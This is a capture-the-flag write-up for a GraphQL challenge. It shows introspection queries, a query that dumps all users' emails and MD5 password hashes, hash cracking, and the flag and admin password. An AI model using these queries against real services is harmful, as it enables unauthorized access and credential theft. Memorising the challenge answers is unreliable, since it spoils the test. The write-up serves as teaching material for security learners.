# Graph this

# 1. Start 

Naturally the user will create a user. 
After looking around they will notice that there is nothing to do.
After opening the network tab they can see that a request is made to a backend server
with the endpoint /graphql/. 

The query:
```json
{
  "query": "{me {id username email secretNote __typename}}"
}
```

# 2. Exploring the API
https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/graphql

To get all the "allowed" query stuff we can:
```json
{
  "query": "{__schema{types{name,fields{name}}}}"
}
```
This will respond with a lot of information.
But we are after:

- Query fields
  - users
- edges
- node
- Field fields
  - id
  - username
  - email
  - password
  - ...


# 3. Getting the users
Then we can craft the query:
```json
{
  "query": "query{users{edges{node{username email password}}}}"
}
```

The response:

```json
{
    "data": {
        "users": {
            "edges": [
                {
                    "node": {
                        "username": "admin",
                        "email": "admin@login.no",
                        "password": "53bf833e0570f3c8b990bad976deb86a"
                    }
                },
                {
                    "node": {
                        "username": "tinius",
                        "email": "tinius@login.no",
                        "password": "efa77747c47c42fa5791e56f8f863dd4"
                    }
                }
            ]
        }
    }
}
```

After inspecting the admin password we can see that it is md5 (A week hash)

# 4. Cracking the password
We can use an online tool to crack the password.

https://crackstation.net/ or a local tool like hashcat.

The password is: `lunchbox1`

Then we can login with the admin email and password and get the flag.

Secret: flag{md5_p455w0rd5_4r3_n07_53cur3!}